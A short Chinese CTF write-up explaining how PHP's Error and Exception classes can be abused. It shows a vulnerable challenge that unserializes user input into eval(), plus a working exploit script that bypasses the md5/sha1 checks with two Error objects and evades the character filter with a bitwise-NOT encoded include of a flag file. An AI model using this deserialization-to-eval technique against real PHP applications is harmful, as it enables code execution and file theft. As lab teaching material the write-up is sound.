php错误类的利用

2021-07-29
PHP原生类中的两个类

Error

(PHP 7, PHP 8)

是所有PHP内部错误类的基类。

Exception

(PHP 5, PHP 7, PHP 8)

是所有异常的基类。

二者都存在__toString方法。当类被当作字符串处理的时候就会触发该方法。

看看被当成字符串时会输出啥？

发现会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），而传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来。

利用

source

 <?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }

        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
  • 第一眼看到md5和sha1会想到利用数组绕过，但是数组在eval中却是执行不了的。
  • 因为Error("payload",1)和Error("payload",2)本身是不一样的但作为字符串的时候输出是一样的。所以可以利用Error和Exception类进行绕过。
  • 过滤了'，"，()这里可以利用取反来进行绕过。
exp
<?php
class SYCLOVER {
    public $syc;
    public $lover;
}
$str = "?><?=include~".urldecode("%D0%99%93%9E%98")."?>";
$a=new Error($str,1);
$b=new Error($str,2);
$c = new SYCLOVER();
$c->syc = $a;
$c->lover = $b;
echo(urlencode(serialize($c)));
?>
